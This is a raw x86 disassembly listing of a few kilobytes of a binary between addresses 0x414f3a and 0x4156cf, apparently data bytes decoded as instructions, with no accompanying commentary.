  414f3a:	sub    BYTE PTR [eax],dl
  414f3c:	add    al,BYTE PTR [eax]
  414f3e:	inc    eax
  414f3f:	or     BYTE PTR [eax],al
  414f41:	add    BYTE PTR [ecx-0x7fdbfbe0],bl
  414f47:	add    DWORD PTR [eax],eax
  414f49:	mov    DWORD PTR [eax-0x7c],eax
  414f4c:	add    al,0x80
  414f4e:	pop    es
  414f4f:	adc    al,0xc1
  414f51:	adc    BYTE PTR [edx+eax*1],al
  414f54:	add    BYTE PTR [edx+eax*4],cl
  414f57:	add    BYTE PTR [ebx+0x10800400],dl
  414f5d:	inc    edx
  414f5e:	inc    eax
  414f5f:	add    BYTE PTR [eax],al
  414f61:	inc    esp
  414f62:	nop
  414f63:	and    BYTE PTR [eax],ch
  414f65:	add    DWORD PTR [ecx],ecx
  414f67:	mov    BYTE PTR [eax+0x400c0200],ch
  414f6d:	mov    BYTE PTR [edx-0x3f77ff58],al
  414f73:	adc    BYTE PTR [eax],cl
  414f75:	add    BYTE PTR [eax+0x5],dl
  414f78:	add    BYTE PTR [eax],ah
  414f7a:	add    BYTE PTR [eax+eax*2],al
  414f7d:	add    DWORD PTR [ebx+eax*1],eax
  414f80:	add    BYTE PTR [ecx-0x80],al
  414f83:	add    al,0x35
  414f85:	add    BYTE PTR [edx+0x50e00050],al
  414f8b:	inc    esp
  414f8c:	sub    al,0x72
  414f8e:	push   ds
  414f8f:	and    BYTE PTR [edx],al
  414f91:	add    eax,0x400a7e04
  414f96:	add    BYTE PTR [eax],al
  414f98:	pusha  
  414f99:	dec    ebp
  414f9a:	add    BYTE PTR [ecx+0x18],al
  414f9d:	and    BYTE PTR [edi+0x41],0xa8
  414fa1:	adc    BYTE PTR [eax],al
  414fa3:	add    BYTE PTR [eax],ch
  414fa5:	add    cl,BYTE PTR [ebx+0xa005]
  414fab:	adc    al,0x0
  414fad:	adc    BYTE PTR [ecx],bl
  414faf:	sbb    al,al
  414fb1:	sbb    BYTE PTR [eax],al
  414fb3:	sbb    al,ah
  414fb5:	add    BYTE PTR [eax],cl
  414fb7:	add    BYTE PTR [eax],dl
  414fb9:	add    BYTE PTR [eax],al
  414fbb:	add    DWORD PTR [eax+0x8],ecx
  414fbe:	push   esp
  414fbf:	or     DWORD PTR [ecx],0x0
  414fc2:	inc    eax
  414fc3:	ret    0x4000
  414fc6:	or     eax,DWORD PTR [eax]
  414fc8:	inc    edx
  414fc9:	add    BYTE PTR [eax],al
  414fcb:	and    al,BYTE PTR [eax]
  414fcd:	sub    dl,BYTE PTR [esi]
  414fcf:	add    BYTE PTR [eax],al
  414fd1:	add    BYTE PTR [ecx],ah
  414fd3:	dec    eax
  414fd4:	adc    BYTE PTR [eax],bl
  414fd6:	or     al,BYTE PTR [ecx]
  414fd8:	jb     0x414fdf
  414fda:	inc    ecx
  414fdb:	push   ecx
  414fdc:	adc    al,BYTE PTR [edx+eax*1-0x52cdffe8]
  414fe3:	push   eax
  414fe4:	adc    BYTE PTR [eax],al
  414fe6:	add    BYTE PTR [eax],al
  414fe8:	add    DWORD PTR [eax+0x44204048],0x40000000
  414ff2:	add    al,ah
  414ff4:	mov    al,ds:0x10800500
  414ff9:	popa   
  414ffa:	ret    0xd92
  414ffd:	add    BYTE PTR [ecx+0x1c],al
  415000:	xchg   BYTE PTR [eax-0x716796b0],ah
  415006:	loope  0x415008
  415008:	jo     0x41500a
  41500a:	add    BYTE PTR [eax],dh
  41500c:	push   ecx
  41500d:	add    BYTE PTR [eax],dl
  41500f:	inc    edx
  415010:	inc    edx
  415011:	add    al,ah
  415013:	dec    eax
  415014:	add    eax,DWORD PTR [eax]
  415016:	or     BYTE PTR [eax],ah
  415018:	add    DWORD PTR [eax],eax
  41501a:	add    BYTE PTR [eax],cl
  41501c:	push   ecx
  41501d:	add    al,BYTE PTR [ebx-0x2f51e7f6]
  415023:	adc    ah,BYTE PTR [ecx]
  415025:	add    BYTE PTR [eax],al
  415027:	loopne 0x415031
  415029:	add    BYTE PTR [edx],bl
  41502b:	add    DWORD PTR [eax],eax
  41502d:	push   es
  41502e:	add    dl,BYTE PTR [eax]
  415030:	add    BYTE PTR [ecx+0x0],dh
  415033:	xor    al,BYTE PTR [ecx]
  415035:	add    BYTE PTR [eax],dl
  415037:	add    BYTE PTR [eax+0x3008cc4],ch
  41503d:	adc    BYTE PTR [eax],al
  41503f:	dec    eax
  415040:	pop    esp
  415041:	add    DWORD PTR [ecx-0x57],0x4122c026
  415048:	and    BYTE PTR [eax-0x80],al
  41504b:	mov    al,0x83
  41504d:	dec    eax
  41504e:	pop    edx
  41504f:	add    DWORD PTR [eax+eax*1],edx
  415052:	or     BYTE PTR [eax],al
  415054:	or     BYTE PTR [eax-0x40],ah
  415057:	test   al,0x62
  415059:	mov    al,ds:0x2010041e
  41505e:	add    esp,DWORD PTR [ecx]
  415060:	add    al,bl
  415062:	xor    BYTE PTR [eax+0x8504040],al
  415068:	add    BYTE PTR [eax],al
  41506a:	dec    esp
  41506b:	add    BYTE PTR [edx+eax*1],dl
  41506e:	add    cl,BYTE PTR [eax]
  415070:	push   es
  415071:	push   esp
  415072:	nop
  415073:	imul   eax,DWORD PTR [edx],0xc0400486
  415079:	and    BYTE PTR [eax],al
  41507b:	add    al,0xa
  41507d:	add    al,0x50
  41507f:	inc    ebx
  415080:	add    BYTE PTR [ecx-0x7e],al
  415083:	leave  
  415084:	push   ebp
  415085:	dec    esp
  415086:	add    DWORD PTR [edx],edx
  415088:	add    BYTE PTR [eax],0x20
  41508b:	add    BYTE PTR [ecx+0x40],cl
  41508e:	add    DWORD PTR [eax+0x48],eax
  415091:	push   es
  415092:	add    BYTE PTR [esp+edx*2+0xa003400],0x10
  41509a:	bound  esi,QWORD PTR [eax+0x20300828]
  4150a0:	inc    eax
  4150a1:	lds    eax,FWORD PTR [edx]
  4150a3:	test   BYTE PTR [eax+ecx*1-0x5bdf7fff],al
  4150aa:	adc    dh,BYTE PTR [eax]
  4150ac:	inc    eax
  4150ad:	add    eax,0x300e7
  4150b2:	or     BYTE PTR [edx],al
  4150b4:	add    al,al
  4150b6:	or     BYTE PTR [eax-0x77ffffaa],ch
  4150bc:	add    DWORD PTR [eax],0x27
  4150bf:	add    BYTE PTR [edx],al
  4150c1:	adc    BYTE PTR [eax+0x59478820],al
  4150c7:	inc    esp
  4150c8:	or     BYTE PTR [esp+ecx*1+0x0],dl
  4150cc:	xor    al,0x41
  4150ce:	adc    BYTE PTR [esp+eax*1],al
  4150d1:	adc    al,BYTE PTR [edx+0x68a8c130]
  4150d7:	or     eax,DWORD PTR [eax]
  4150d9:	inc    ecx
  4150da:	push   ds
  4150db:	add    BYTE PTR [eax],al
  4150dd:	or     ah,0x30
  4150e0:	add    BYTE PTR [eax],ah
  4150e2:	add    al,0x21
  4150e4:	xor    BYTE PTR [eax],al
  4150e6:	add    al,0x14
  4150e8:	adc    BYTE PTR [eax],al
  4150ea:	add    cl,BYTE PTR [eax+0xb48538]
  4150f0:	sbb    BYTE PTR [edx],bl
  4150f2:	test   DWORD PTR [eax],esi
  4150f4:	add    BYTE PTR [eax],al
  4150f6:	inc    ebp
  4150f7:	and    BYTE PTR [ecx],al
  4150f9:	pusha  
  4150fa:	inc    eax
  4150fb:	add    al,al
  4150fd:	add    BYTE PTR [eax],0x44
  415100:	add    BYTE PTR [eax+eax*1+0x2000851],bl
  415107:	rcl    DWORD PTR [eax],0x28
  41510a:	nop
  41510b:	retf   0xc249
  41510e:	or     DWORD PTR [ecx],edx
  415110:	retf   0x964
  415113:	inc    ebx
  415114:	or     BYTE PTR [ebx+0x10c0021a],dl
  41511a:	sub    dl,BYTE PTR [edx+0x21]
  41511d:	add    BYTE PTR [eax],dh
  41511f:	push   ss
  415120:	inc    ecx
  415121:	add    eax,DWORD PTR [eax]
  415123:	push   es
  415124:	add    BYTE PTR ds:0x10428005,al
  41512a:	add    dl,BYTE PTR [eax]
  41512c:	add    esp,DWORD PTR [edx]
  41512e:	mov    al,ds:0x4c442030
  415133:	add    BYTE PTR [ecx+0x4100b181],al
  415139:	add    BYTE PTR [eax],cl
  41513b:	add    BYTE PTR [ecx+eax*2],cl
  41513e:	rol    BYTE PTR [eax],0x0
  415141:	inc    ebx
  415142:	add    DWORD PTR [eax],eax
  415144:	sub    BYTE PTR [ecx+0x4000001],dl
  41514a:	adc    DWORD PTR [ecx-0x40],eax
  41514d:	add    BYTE PTR [eax],al
  41514f:	add    BYTE PTR [eax],al
  415151:	or     DWORD PTR [edx],0xffffff84
  415154:	and    BYTE PTR [eax+0x41],0x0
  415158:	or     BYTE PTR [eax],al
  41515a:	add    BYTE PTR [ecx+0x19],cl
  41515d:	add    DWORD PTR [edi-0x7c],esp
  415160:	and    DWORD PTR [eax+eax*1+0xb400040],0x48100100
  41516b:	sub    cl,BYTE PTR [eax]
  41516d:	add    BYTE PTR [eax+0x4],al
  415170:	and    al,0x1
  415172:	xchg   BYTE PTR [ecx],bl
  415174:	rol    DWORD PTR [eax],0x40
  415177:	rol    BYTE PTR [eax],0x11
  41517a:	mov    al,ds:0x4008004
  41517f:	dec    ecx
  415180:	add    BYTE PTR [eax+0x98090],al
  415186:	add    al,BYTE PTR [eax]
  415188:	add    BYTE PTR [ecx],al
  41518a:	adc    DWORD PTR [eax],eax
  41518c:	add    dh,BYTE PTR [ebx+0x50]
  41518f:	adc    al,BYTE PTR [ecx]
  415191:	add    al,0x21
  415193:	xor    BYTE PTR [edx+0x61],bh
  415196:	add    al,0x46
  415198:	popa   
  415199:	loope  0x41511b
  41519b:	add    dl,BYTE PTR [eax-0x78]
  41519e:	add    BYTE PTR [ebx],dl
  4151a0:	add    edx,DWORD PTR [eax+0x40]
  4151a3:	inc    eax
  4151a4:	add    DWORD PTR [eax],ecx
  4151a6:	and    BYTE PTR [edi+0x0],dh
  4151a9:	arpl   WORD PTR [eax+edx*1],ax
  4151ac:	add    BYTE PTR [ecx],ah
  4151ae:	add    al,BYTE PTR [ecx]
  4151b0:	and    al,0x80
  4151b2:	push   ebx
  4151b3:	popa   
  4151b4:	and    BYTE PTR [edx],cl
  4151b6:	add    DWORD PTR [esp+eax*1],eax
  4151b9:	add    BYTE PTR [edx+0x64c15100],ah
  4151bf:	inc    ebx
  4151c0:	arpl   WORD PTR [eax],ax
  4151c2:	push   eax
  4151c3:	add    eax,DWORD PTR [ecx+0x15]
  4151c6:	add    BYTE PTR [eax+ecx*2],al
  4151c9:	add    BYTE PTR [eax],al
  4151cb:	add    al,bl
  4151cd:	xchg   BYTE PTR [eax],dl
  4151cf:	and    dl,BYTE PTR [eax+0x64820012]
  4151d5:	xchg   ebx,eax
  4151d6:	add    DWORD PTR [eax],0x19408001
  4151dc:	dec    ecx
  4151dd:	pusha  
  4151de:	adc    bl,BYTE PTR [eax]
  4151e0:	or     BYTE PTR [edx+0x884088],0x0
  4151e7:	add    al,BYTE PTR [eax]
  4151e9:	add    BYTE PTR [ecx],bl
  4151eb:	add    DWORD PTR [eax+0x0],eax
  4151ee:	or     BYTE PTR [eax],ah
  4151f0:	or     BYTE PTR [esp+eax*1],al
  4151f3:	adc    BYTE PTR [eax],al
  4151f5:	test   BYTE PTR [eax],al
  4151f7:	add    BYTE PTR [esi],al
  4151f9:	add    al,0x81
  4151fb:	inc    eax
  4151fc:	and    ch,BYTE PTR ds:0x20402808
  415202:	mov    al,ds:0xc0681230
  415207:	inc    ebp
  415208:	add    BYTE PTR [eax],0x0
  41520b:	inc    edx
  41520c:	add    BYTE PTR [eax+0x14b00048],ah
  415212:	inc    esp
  415213:	sbb    BYTE PTR [eax],cl
  415215:	or     BYTE PTR [edx],al
  415217:	and    DWORD PTR [eax+0x42207000],eax
  41521d:	add    BYTE PTR [edx-0x80],cl
  415220:	mov    BYTE PTR [eax+ebp*1+0x0],al
  415224:	add    al,0x8
  415226:	add    eax,0x20a0014
  41522b:	xor    BYTE PTR [eax+0x30481080],cl
  415231:	sub    BYTE PTR [eax],al
  415233:	add    DWORD PTR [edx+0x0],0x22039041
  41523a:	sub    BYTE PTR [eax+0x4a],al
  41523d:	push   esp
  41523e:	or     al,BYTE PTR [eax]
  415240:	add    al,0x0
  415242:	add    BYTE PTR [edx+0x20000180],dl
  415248:	dec    ebx
  415249:	or     al,BYTE PTR [eax+edx*4]
  41524c:	sbb    BYTE PTR [ecx],al
  41524e:	add    BYTE PTR [eax],dl
  415250:	inc    ecx
  415251:	sub    al,BYTE PTR cs:[eax]
  415254:	xor    ah,al
  415256:	pop    eax
  415257:	add    eax,0xc1020
  41525c:	and    DWORD PTR [eax],0x25
  41525f:	and    DWORD PTR [eax+eax*1],0x20410041
  415266:	ror    BYTE PTR [eax],0x80
  415269:	sbb    al,0x10
  41526b:	sub    BYTE PTR [eax],0x0
  41526e:	mov    ds:0x280046c9,al
  415273:	add    BYTE PTR [eax],0x1
  415276:	or     al,0x2
  415278:	add    al,0x20
  41527a:	or     ch,BYTE PTR [eax]
  41527c:	adc    ch,BYTE PTR [edx+0x10]
  41527f:	and    BYTE PTR [esp],ah
  415282:	inc    esp
  415283:	xchg   ebx,eax
  415284:	add    BYTE PTR [edx],al
  415286:	or     BYTE PTR [ecx+0x0],al
  415289:	add    BYTE PTR [eax+0x22],al
  41528c:	rol    BYTE PTR [ecx+0x16],1
  41528f:	add    al,0x35
  415291:	pop    edx
  415292:	add    BYTE PTR [eax],0x40
  415295:	push   0x1000004
  41529a:	add    BYTE PTR [edi],bh
  41529c:	add    BYTE PTR [ecx],al
  41529e:	add    DWORD PTR [eax+eax*1+0x0],eax
  4152a2:	and    BYTE PTR [ecx],al
  4152a4:	and    DWORD PTR [eax],eax
  4152a6:	cmp    eax,DWORD PTR [edx]
  4152a8:	leave  
  4152a9:	inc    eax
  4152aa:	add    BYTE PTR [eax+0x18],al
  4152ad:	add    al,BYTE PTR [ebx+eax*4+0x0]
  4152b1:	inc    eax
  4152b2:	nop
  4152b3:	pop    esp
  4152b4:	adc    al,BYTE PTR [eax-0x6c7ff6f7]
  4152ba:	add    BYTE PTR [eax],al
  4152bc:	add    ah,BYTE PTR [ecx+0x42]
  4152bf:	adc    BYTE PTR [eax-0x3f],al
  4152c2:	add    DWORD PTR [edx+0x89210b],edx
  4152c8:	add    BYTE PTR [ecx+0x900006],ah
  4152ce:	xor    BYTE PTR [ecx],al
  4152d0:	and    al,0x44
  4152d2:	sbb    DWORD PTR [edx],ebp
  4152d4:	adc    al,BYTE PTR [esi]
  4152d6:	add    DWORD PTR [eax+eax*1-0x7f6df7f0],ecx
  4152dd:	or     DWORD PTR [ecx],eax
  4152df:	add    BYTE PTR [ecx],ah
  4152e1:	or     BYTE PTR [eax],al
  4152e3:	push   eax
  4152e4:	sbb    DWORD PTR [ecx],edx
  4152e6:	nop
  4152e7:	add    BYTE PTR [eax+0x8102],al
  4152ed:	or     eax,0x409008
  4152f2:	adc    BYTE PTR [edx+0x1],al
  4152f5:	or     BYTE PTR [ecx-0x7ff8bff8],0x2
  4152fc:	and    DWORD PTR [eax],eax
  4152fe:	add    BYTE PTR [ecx+0x58],al
  415301:	add    BYTE PTR [eax],dh
  415303:	add    BYTE PTR [eax],ah
  415305:	add    eax,0x5700148a
  41530a:	sbb    BYTE PTR [edx+eiz*1],al
  41530d:	add    BYTE PTR [edx+0x1a800088],al
  415313:	or     BYTE PTR [edx],al
  415315:	mov    al,ds:0x8020c020
  41531a:	add    BYTE PTR [eax],al
  41531c:	add    BYTE PTR [eax+0x40410085],al
  415322:	add    BYTE PTR [edx],bl
  415324:	add    ch,BYTE PTR [edx]
  415326:	adc    BYTE PTR [eax],al
  415328:	add    al,0x24
  41532a:	adc    DWORD PTR [eax],eax
  41532c:	adc    BYTE PTR [edx+0x63a40034],bl
  415332:	inc    ebp
  415333:	or     DWORD PTR [edx],eax
  415335:	sub    al,BYTE PTR [eax]
  415337:	test   al,0xc3
  415339:	or     DWORD PTR [eax],eax
  41533b:	add    BYTE PTR [eax],cl
  41533d:	rol    BYTE PTR [edx],0x43
  415340:	adc    BYTE PTR [ecx+0x400000],dl
  415346:	or     BYTE PTR [eax],al
  415348:	push   eax
  415349:	add    BYTE PTR [edx+0x0],al
  41534c:	and    BYTE PTR [esi],dl
  41534e:	and    BYTE PTR [ecx],al
  415350:	and    al,BYTE PTR [ecx-0x76]
  415353:	adc    DWORD PTR [eax],eax
  415355:	add    BYTE PTR [eax],al
  415357:	inc    eax
  415358:	and    al,0x2e
  41535a:	add    BYTE PTR [ecx],al
  41535c:	daa    
  41535d:	inc    eax
  41535e:	inc    eax
  41535f:	add    BYTE PTR [esp+ecx*2-0x6ffefff0],al
  415366:	adc    BYTE PTR [ecx],al
  415368:	add    BYTE PTR [edx],al
  41536a:	push   es
  41536b:	and    BYTE PTR [eax],al
  41536d:	cwde   
  41536e:	or     BYTE PTR [eax],al
  415370:	and    BYTE PTR [eax+0x60120],al
  415376:	or     DWORD PTR [ebx+0x2084086],ebx
  41537c:	and    edi,DWORD PTR [eax+0x0]
  41537f:	or     BYTE PTR [eax+0x8],al
  415382:	add    BYTE PTR [eax+eax*4],al
  415385:	add    BYTE PTR [ecx],al
  415387:	add    BYTE PTR [eax],ah
  415389:	add    BYTE PTR [esp+ecx*1+0x0],al
  41538d:	and    eax,DWORD PTR [ecx+0x48810010]
  415393:	or     BYTE PTR [eax+ecx*4],al
  415396:	add    BYTE PTR [eax+0x4a010805],0x0
  41539d:	add    al,BYTE PTR [esi]
  41539f:	add    BYTE PTR [eax+esi*1+0x41],al
  4153a3:	add    BYTE PTR [eax],0x80
  4153a6:	add    BYTE PTR [eax],0x0
  4153a9:	add    al,BYTE PTR [eax-0x80]
  4153ac:	add    BYTE PTR [ebx],dl
  4153ae:	rol    BYTE PTR [ebx+0x48150001],0x60
  4153b5:	inc    ecx
  4153b6:	and    BYTE PTR [ecx],cl
  4153b8:	imul   eax,DWORD PTR [eax+eiz*1],0xffffff80
  4153bc:	inc    ecx
  4153bd:	adc    edx,DWORD PTR [eax]
  4153bf:	inc    eax
  4153c0:	or     BYTE PTR ds:0x40500165,al
  4153c6:	xchg   edx,eax
  4153c7:	sbb    BYTE PTR [eax],ch
  4153c9:	add    al,0x1b
  4153cb:	add    BYTE PTR [eax],0x0
  4153ce:	mov    ds:0xc241,al
  4153d3:	add    BYTE PTR [eax+0x1b00249],al
  4153d9:	or     BYTE PTR [ecx+0x0],dl
  4153dc:	inc    eax
  4153dd:	add    BYTE PTR [edx+0x1],cl
  4153e0:	mov    al,ds:0x600041
  4153e5:	inc    ebp
  4153e6:	add    BYTE PTR [edx],al
  4153e8:	add    BYTE PTR [eax],al
  4153ea:	inc    ecx
  4153eb:	mov    DWORD PTR [ebp+0x55],ebp
  4153ee:	or     BYTE PTR [eax],al
  4153f0:	sub    BYTE PTR [eax],cl
  4153f2:	add    BYTE PTR [eax],dh
  4153f4:	add    BYTE PTR [ecx+0x40],al
  4153f7:	xor    BYTE PTR [eax+0x1c008c0],al
  4153fd:	or     al,BYTE PTR [eax]
  4153ff:	push   edx
  415400:	test   al,0x81
  415402:	add    BYTE PTR fs:[ecx],ah
  415405:	add    DWORD PTR [eax+eax*1+0x6],0x2300102
  41540d:	add    al,BYTE PTR [ecx+0x1b08]
  415413:	inc    edx
  415414:	push   es
  415415:	popa   
  415416:	inc    edx
  415417:	mov    BYTE PTR [eax+0x0],cl
  41541a:	pop    esp
  41541b:	sub    al,BYTE PTR [ebx]
  41541d:	or     BYTE PTR [edx],0x8
  415420:	xchg   BYTE PTR ds:0x106c2261,dh
  415426:	and    BYTE PTR [ecx+0x48],al
  415429:	adc    cl,BYTE PTR [eax]
  41542b:	and    dl,al
  41542d:	inc    eax
  41542e:	rol    BYTE PTR [eax+0x1211a449],1
  415434:	popf   
  415435:	or     BYTE PTR [ecx],ah
  415437:	test   BYTE PTR [ebp+0x10],al
  41543a:	or     BYTE PTR [eax],ah
  41543c:	add    BYTE PTR [eax+ecx*1],0x80
  415440:	add    BYTE PTR [edx+0x0],0x0
  415444:	adc    BYTE PTR [edi+0xc],ah
  415447:	mov    al,ds:0x1ac0000
  41544c:	add    DWORD PTR [edx],esp
  41544e:	push   edx
  41544f:	push   ecx
  415450:	add    BYTE PTR [eax],al
  415452:	add    DWORD PTR [edx],0x2805930
  415458:	inc    ecx
  415459:	mov    ecx,0xc0900adc
  41545e:	adc    BYTE PTR [eax],al
  415460:	add    al,0x1
  415462:	add    BYTE PTR [eax],al
  415464:	dec    eax
  415465:	sbb    DWORD PTR [eax],eax
  415467:	adc    al,BYTE PTR [eax+0x140303a]
  41546d:	bound  ecx,QWORD PTR [eax-0x713bffbf]
  415473:	or     DWORD PTR [eax+0x4313a212],0x4e04140
  41547d:	sbb    BYTE PTR [eax+eiz*1],dl
  415480:	push   ecx
  415481:	adc    DWORD PTR [esi],ecx
  415483:	add    BYTE PTR [eax],al
  415485:	add    al,BYTE PTR [eax]
  415487:	add    eax,DWORD PTR [eax+0x0]
  41548a:	add    BYTE PTR [eax],al
  41548c:	xor    BYTE PTR [edx],dl
  41548e:	inc    eax
  41548f:	mov    BYTE PTR [eax+eax*4],al
  415492:	add    BYTE PTR [eax+0x0],dl
  415495:	add    eax,DWORD PTR [edx+eax*1+0x2a01c941]
  41549c:	inc    eax
  41549d:	inc    eax
  41549e:	inc    ecx
  41549f:	add    BYTE PTR [eax],0x8
  4154a2:	add    BYTE PTR [eax+0x28032840],ah
  4154a8:	add    BYTE PTR [ecx+0x42],ah
  4154ab:	add    BYTE PTR [eax],0x4
  4154ae:	or     al,BYTE PTR [eax]
  4154b0:	add    DWORD PTR [ecx],esp
  4154b2:	add    DWORD PTR [esi+0x0],eax
  4154b5:	test   BYTE PTR [eax],dl
  4154b7:	add    BYTE PTR [eax],bl
  4154b9:	inc    esp
  4154ba:	pusha  
  4154bb:	inc    eax
  4154bc:	test   eax,0x11500b4
  4154c1:	add    BYTE PTR [eax-0x3d],ah
  4154c4:	add    al,0x25
  4154c6:	rol    DWORD PTR [esi],0x0
  4154c9:	adc    BYTE PTR [eax],ah
  4154cb:	add    al,al
  4154cd:	popa   
  4154ce:	adc    BYTE PTR [eax],ch
  4154d0:	add    BYTE PTR [eax],al
  4154d2:	add    BYTE PTR [edx+0x1],dl
  4154d5:	test   BYTE PTR [eax],al
  4154d7:	add    DWORD PTR [eax],ecx
  4154d9:	add    BYTE PTR [eax+0x44c00031],bl
  4154df:	ret    0x6800
  4154e2:	sbb    al,0x50
  4154e4:	push   edx
  4154e5:	adc    eax,0x20020f0
  4154ea:	add    BYTE PTR [eax],cl
  4154ec:	add    BYTE PTR [edx+0x0],ah
  4154ef:	and    al,BYTE PTR [ecx+eax*2]
  4154f2:	add    BYTE PTR [eax],al
  4154f4:	add    al,BYTE PTR [eax]
  4154f6:	add    BYTE PTR [ecx],al
  4154f8:	jno    0x41553a
  4154fa:	add    al,BYTE PTR [ecx]
  4154fc:	add    BYTE PTR [eax+eax*1+0x22],al
  415500:	sub    BYTE PTR [eax],dl
  415502:	retf   0x0
  415505:	add    BYTE PTR [eax+0x46],al
  415508:	adc    BYTE PTR [eax+0x0],dl
  41550b:	add    al,0x8
  41550e:	add    al,0xb3
  415510:	inc    esi
  415511:	jo     0x415524
  415513:	add    BYTE PTR [edx],al
  415515:	add    al,0x0
  415517:	add    DWORD PTR [eax],eax
  415519:	adc    eax,0x4001304
  41551e:	add    BYTE PTR [eax],al
  415520:	and    al,0x28
  415523:	adc    BYTE PTR [eax],ah
  415525:	adc    DWORD PTR [eax],ecx
  415527:	add    DWORD PTR [eax],esp
  415529:	add    BYTE PTR [eax],cl
  41552b:	adc    BYTE PTR [ecx+0x430d0200],al
  415531:	jns    0x415533
  415533:	mov    ah,al
  415535:	add    BYTE PTR [eax],ch
  415537:	adc    DWORD PTR [edx],eax
  415539:	add    BYTE PTR [ecx+0x12],0x42
  41553d:	or     BYTE PTR [ecx+0x4],al
  415540:	inc    edx
  415541:	and    DWORD PTR [eax],eax
  415543:	sub    BYTE PTR [eax+0x4e2000a8],ah
  415549:	or     DWORD PTR [eax],ebp
  41554b:	xor    eax,0x80301081
  415550:	add    BYTE PTR [ebp+0x55088001],dl
  415556:	add    BYTE PTR [eax],al
  415558:	adc    BYTE PTR [ebp+0x20],al
  41555b:	sbb    al,0xe
  41555d:	mov    al,BYTE PTR [eax+ebp*1+0x4283008]
  415564:	inc    esp
  415565:	adc    BYTE PTR [eax],0x2
  415568:	add    DWORD PTR [eax],0xa07902
  41556e:	inc    eax
  41556f:	add    al,0x0
  415571:	add    eax,0x40060240
  415576:	add    al,BYTE PTR [esp+eiz*8]
  415579:	push   es
  41557a:	test   BYTE PTR [eax],al
  41557c:	and    BYTE PTR [ecx],0x0
  41557f:	add    BYTE PTR [esp+eax*1+0x29100010],ch
  415586:	inc    eax
  415587:	add    BYTE PTR [eax+0x39],al
  41558a:	adc    BYTE PTR [eax],al
  41558c:	add    BYTE PTR [ebx+0x4],al
  41558f:	add    BYTE PTR [eax],al
  415591:	dec    ecx
  415592:	or     al,0x50
  415594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415595:	pop    eax
  415596:	push   ecx
  415597:	add    BYTE PTR [eax+0x188],0x0
  41559e:	add    cl,BYTE PTR [eax+edx*4]
  4155a1:	add    BYTE PTR [esp],al
  4155a4:	add    BYTE PTR [eax+0x0],al
  4155a7:	push   ecx
  4155a8:	or     BYTE PTR [eax],al
  4155aa:	cdq    
  4155ab:	inc    ecx
  4155ac:	or     al,ch
  4155ae:	and    eax,DWORD PTR [eax+0x29]
  4155b1:	add    BYTE PTR [edx],cl
  4155b3:	add    BYTE PTR [eax+ebp*4+0x50499d],al
  4155ba:	add    al,0x4
  4155bc:	add    BYTE PTR [ebx+edx*1],dl
  4155bf:	add    BYTE PTR [eax],al
  4155c1:	add    BYTE PTR [edx-0x7ffba7f8],cl
  4155c7:	add    BYTE PTR [ecx],0x4
  4155ca:	xchg   edx,eax
  4155cb:	bound  eax,QWORD PTR [edx+esi*1-0x80]
  4155cf:	test   BYTE PTR [eax],al
  4155d1:	or     BYTE PTR [edx+0x8150004],al
  4155d7:	add    BYTE PTR [ebx+0x40428810],cl
  4155dd:	add    BYTE PTR [eax],ah
  4155df:	test   DWORD PTR [eax],eax
  4155e1:	add    DWORD PTR [eax+eax*1],0x4
  4155e5:	adc    BYTE PTR [bp+si],al
  4155e8:	push   cs
  4155e9:	inc    ebp
  4155ea:	stc    
  4155eb:	inc    ecx
  4155ec:	push   ecx
  4155ed:	add    dl,BYTE PTR [ecx]
  4155ef:	add    BYTE PTR [eax],dl
  4155f1:	dec    eax
  4155f2:	jne    0x4155f4
  4155f4:	inc    eax
  4155f5:	mov    ds:0x8c110042,eax
  4155fa:	and    BYTE PTR [edx],dl
  4155fc:	adc    dl,BYTE PTR [edx-0x7a]
  4155ff:	test   al,0xc0
  415601:	add    BYTE PTR [eax+0x0],0x8b
  415605:	nop
  415606:	mov    eax,0x8046000
  41560b:	xor    BYTE PTR [eax+0x1],dl
  41560e:	add    edx,0x48956102
  415614:	or     al,BYTE PTR [esi+0x21]
  415617:	bound  edx,QWORD PTR [edx+eax*1+0x20140103]
  41561e:	add    DWORD PTR [esi+0x20],ecx
  415621:	add    ah,BYTE PTR fs:[ebx+0x4]
  415625:	add    DWORD PTR [eax+0x41c5],0x58100400
  41562f:	inc    edx
  415630:	inc    esp
  415631:	popf   
  415632:	verr   WORD PTR [eax+0x800]
  415639:	mov    al,ds:0xa810c50
  41563e:	add    BYTE PTR [esi],al
  415640:	and    al,BYTE PTR [eax]
  415642:	inc    eax
  415643:	add    dl,BYTE PTR fs:[eax]
  415646:	and    BYTE PTR [eax+edi*1],cl
  415649:	adc    BYTE PTR [eax+0x4c],ah
  41564c:	inc    ebx
  41564d:	or     BYTE PTR [ecx],al
  41564f:	sub    ah,BYTE PTR [edx+0x0]
  415652:	add    BYTE PTR [ebx],bh
  415654:	add    BYTE PTR [eax],al
  415656:	add    BYTE PTR [eax],al
  415658:	leave  
  415659:	mov    eax,0x82412c04
  41565e:	add    BYTE PTR [ecx+0x51],dl
  415661:	adc    BYTE PTR [eax],al
  415663:	bound  esp,QWORD PTR [edx+0x14]
  415666:	add    DWORD PTR [eax],eax
  415668:	adc    BYTE PTR [eax+0x800],0x0
  41566f:	add    al,dl
  415671:	inc    ecx
  415672:	add    DWORD PTR [eax],0xa180803
  415678:	or     BYTE PTR [eax],al
  41567a:	inc    eax
  41567b:	mov    al,0xa
  41567d:	add    BYTE PTR [ecx],al
  41567f:	add    BYTE PTR [eax],0x4
  415682:	add    al,0x18
  415684:	add    bl,BYTE PTR [ebx+0x20888890]
  41568a:	xor    BYTE PTR [edx],dl
  41568c:	xor    BYTE PTR [edx+eax*1],al
  41568f:	push   es
  415690:	xchg   edx,eax
  415691:	pusha  
  415692:	add    bh,BYTE PTR [ecx+0x0]
  415695:	and    BYTE PTR [eax+0x211ba680],al
  41569b:	and    BYTE PTR [eax],ah
  41569d:	add    DWORD PTR [eax],edx
  41569f:	nop
  4156a0:	and    BYTE PTR [eax+0x568a002],al
  4156a6:	add    al,BYTE PTR [eax+eiz*1+0x4910]
  4156ad:	les    edx,FWORD PTR [ebp-0x68]
  4156b0:	mov    al,BYTE PTR [esp+eax*1]
  4156b3:	add    ah,BYTE PTR [eax]
  4156b5:	add    eax,0x1401a00
  4156ba:	add    BYTE PTR [edx],dl
  4156bc:	add    BYTE PTR [eax+eiz*1],ah
  4156bf:	inc    ecx
  4156c0:	add    al,cl
  4156c2:	sbb    eax,0x20020901
  4156c7:	rol    DWORD PTR [eax],0x26
  4156ca:	xor    BYTE PTR [eax-0x80],al
  4156cd:	add    cl,BYTE PTR [edx]
  4156cf:	aam    0x2
